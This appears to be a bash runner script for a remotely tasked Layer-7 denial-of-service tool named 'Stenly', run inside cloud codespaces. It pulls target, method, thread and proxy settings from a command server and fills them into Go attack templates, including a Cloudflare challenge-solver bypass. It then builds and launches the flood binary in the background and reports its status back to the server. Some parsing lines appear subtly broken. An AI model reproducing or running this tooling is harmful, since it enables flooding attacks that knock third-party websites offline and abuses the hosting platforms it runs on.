#!/bin/bash
set -e

# Config
SERVER_URL="__SERVER_URL__"
TASK_ID="${TASK_ID:-0}"
LOG_FILE="/tmp/stenly_runner.log"

log() {
  echo "[$(date +%H:%M:%S)] $1" | tee -a $LOG_FILE
  curl -s -X POST "$SERVER_URL/api/codespace/report" \
    -H "Content-Type: application/json" \
    -d "{\"task_id\":$TASK_ID,\"message\":\"$1\"}" 2>/dev/null || true
}

log "Stenly Attack Runner started"
log "Fetching task config from $SERVER_URL..."

# Fetch attack config
CONFIG=$(curl -s "$SERVER_URL/api/codespace/task/$TASK_ID" 2>/dev/null || echo {error:fetch_failed})
TARGET=$(echo "$CONFIG" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get(target_url,))" 2>/dev/null || echo "")
METHOD=$(echo "$CONFIG" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get(method,HEAVY_GET))" 2>/dev/null || echo "HEAVY_GET")
DURATION=$(echo "$CONFIG" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get(duration,60))" 2>/dev/null || echo "60")
THREADS=$(echo "$CONFIG" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get(threads,100))" 2>/dev/null || echo "100")
USE_PROXY=$(echo "$CONFIG" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get(use_proxy,false))" 2>/dev/null || echo "false")
RPS=$(echo "$CONFIG" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get(rps,0))" 2>/dev/null || echo "0")

if [ -z "$TARGET" ] || [ "$TARGET" = "None" ]; then
  log "ERROR: No target URL in config"
  exit 1
fi

log "Target: $TARGET | Method: $METHOD | Duration: ${DURATION}s | Threads: $THREADS"

# Find Go source files
cd /workspaces/$(ls /workspaces/ 2>/dev/null || echo "stenly-l7")
log "Working directory: $(pwd)"

# Check Go installation
which go && log "Go: $(go version)" || { log "ERROR: Go not found"; exit 1; }

# Parameterize the Go source files
log "Parameterizing templates..."
for f in *.go; do
  sed -i "s|{{.TargetURL}}|$TARGET|g" "$f" 2>/dev/null || true
  sed -i "s|{{.Method}}|$METHOD|g" "$f" 2>/dev/null || true
  sed -i "s|{{.Duration}}|$DURATION|g" "$f" 2>/dev/null || true
  sed -i "s|{{.Threads}}|$THREADS|g" "$f" 2>/dev/null || true
  sed -i "s|{{.UseProxy}}|$USE_PROXY|g" "$f" 2>/dev/null || true
  sed -i "s|{{.RPS}}|$RPS|g" "$f" 2>/dev/null || true
  sed -i "s|{{.UserAgent}}|Stenly-Codespace|g" "$f" 2>/dev/null || true
  sed -i "s|{{.ProxyFile}}|/tmp/proxy.json|g" "$f" 2>/dev/null || true
  sed -i "s|{{.UAFile}}|/tmp/ua.txt|g" "$f" 2>/dev/null || true
  sed -i "s|{{.CfClearance}}|" "|g" "$f" 2>/dev/null || true
  sed -i "s|{{.CfBm}}|" "|g" "$f" 2>/dev/null || true
  sed -i "s|{{.CfSolverAPI}}|$SERVER_URL/api/cf-solve|g" "$f" 2>/dev/null || true
  sed -i "s|{{.BypassHost}}||g" "$f" 2>/dev/null || true
done

log "Building attack binary..."
go build -o /tmp/stenly_attack . 2>&1 | tee -a $LOG_FILE || { log "Build failed"; exit 1; }

log "Build successful! Running attack..."
log "PID: $$"
nohup /tmp/stenly_attack > /tmp/attack_output.log 2>&1 &
ATTACK_PID=$!
log "Attack running with PID: $ATTACK_PID"

# Report back that attack is running
curl -s -X POST "$SERVER_URL/api/codespace/report" \
  -H "Content-Type: application/json" \
  -d "{\"task_id\":$TASK_ID,\"message\":\"Attack running with PID $ATTACK_PID\",\"status\":\"running\",\"pid\":$ATTACK_PID}" 2>/dev/null || true

# Wait for attack duration
sleep $DURATION

# Cleanup
kill $ATTACK_PID 2>/dev/null || true
log "Attack completed after ${DURATION}s"
curl -s -X POST "$SERVER_URL/api/codespace/report" \
  -H "Content-Type: application/json" \
  -d "{\"task_id\":$TASK_ID,\"message\":\"Attack completed\",\"status\":\"completed\"}" 2>/dev/null || true
